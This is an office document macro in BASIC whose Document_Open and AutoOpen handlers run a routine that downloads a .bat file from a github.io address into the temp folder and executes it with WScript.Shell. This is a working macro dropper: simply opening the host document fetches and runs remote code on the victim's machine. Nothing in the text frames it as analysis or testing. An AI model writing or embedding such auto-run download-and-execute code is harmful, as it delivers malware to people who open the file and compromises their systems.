REM  *****  BASIC  *****
Sub Document_Open()
Main
End Sub 

Sub AutoOpen()
Main
End Sub 

Sub Main
Dim url, localFile, http, stream, shell

' URL of the hosted .bat
url = "https://do-not-download-again.github.io/script.bat"

' Local path to save it
localFile = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\downloaded_script.bat"

Set http   = CreateObject("MSXML2.XMLHTTP")
Set stream = CreateObject("ADODB.Stream")
Set shell  = CreateObject("WScript.Shell")

' Download the file
http.Open "GET", url, False
http.Send

If http.Status = 200 Then
    With stream
        .Type = 1      ' Binary
        .Open
        .Write http.responseBody
        .SaveToFile localFile, 2   ' Overwrite
        .Close
    End With

    ' Execute the .bat file
    shell.Run """" & localFile & """", 1, False
Else
    MsgBox "Download failed: HTTP " & http.Status
End If
End Sub
